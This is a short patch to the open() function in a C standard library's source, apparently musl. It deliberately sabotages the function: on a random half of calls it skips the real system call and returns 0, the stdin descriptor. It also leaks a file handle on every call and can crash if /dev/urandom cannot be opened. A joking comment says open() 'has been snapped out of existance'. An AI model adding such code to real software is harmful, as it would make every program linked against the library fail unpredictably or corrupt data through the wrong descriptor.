@@ -1,0 +1,50 @@
+--- a/src/fcntl/open.c	2018-07-03 01:56:23.849682927 -0400
++++ b/src/fcntl/open.c	2018-07-03 02:01:26.101314623 -0400
+@@ -1,24 +1,35 @@
+ #include <fcntl.h>
+ #include <stdarg.h>
++#include <stdio.h>
+ #include "syscall.h"
+ #include "libc.h"
+ 
+ int open(const char *filename, int flags, ...)
+ {
+-	mode_t mode = 0;
+-
+-	if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) {
+-		va_list ap;
+-		va_start(ap, flags);
+-		mode = va_arg(ap, mode_t);
+-		va_end(ap);
++	FILE *fp;
++	fp = fopen("/dev/urandom", "r");
++	if(!fp) {
++		fp = fopen("/dev/urandom", "r");
++	}
++	if(fgetc(fp)%2) {
++		mode_t mode = 0;
++	
++		if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) {
++			va_list ap;
++			va_start(ap, flags);
++			mode = va_arg(ap, mode_t);
++			va_end(ap);
++		}
++	
++		int fd = __sys_open_cp(filename, flags, mode);
++		if (fd>=0 && (flags & O_CLOEXEC))
++			__syscall(SYS_fcntl, fd, F_SETFD, FD_CLOEXEC);
++	
++		return __syscall_ret(fd);
+ 	}
+ 
+-	int fd = __sys_open_cp(filename, flags, mode);
+-	if (fd>=0 && (flags & O_CLOEXEC))
+-		__syscall(SYS_fcntl, fd, F_SETFD, FD_CLOEXEC);
+-
+-	return __syscall_ret(fd);
++	// open() has been snapped out of existance
++	return 1/2;
+ }
+ 
+ LFS64(open);
